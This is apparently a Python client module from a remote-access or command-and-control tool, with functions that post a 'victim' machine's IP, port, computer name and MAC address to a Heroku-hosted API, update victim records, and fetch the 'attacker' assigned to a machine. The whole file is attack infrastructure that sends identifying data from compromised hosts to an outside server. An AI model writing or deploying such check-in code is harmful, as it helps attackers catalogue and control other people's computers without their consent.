import requests


def create_victim(ip, port, computer_name, mac_address):
    data = {
        'ip': ip,
        'port': port,
        'computer_name': computer_name,
        'mac_address': mac_address,
        'logged_in': True,
    }
    response = requests.post('https://intense-river-70224.herokuapp.com/api/victims/', data=data)
    return response


def update_victim(mac_address, data):
    response = requests.patch(f'https://intense-river-70224.herokuapp.com/api/victims/{mac_address}/',
                              data=data)
    return response


def get_attacker(mac_address):
    response = requests.get(
        f'https://intense-river-70224.herokuapp.com/api/attackers/get_attacker/?mac_address='
        f'{mac_address}')
    return response
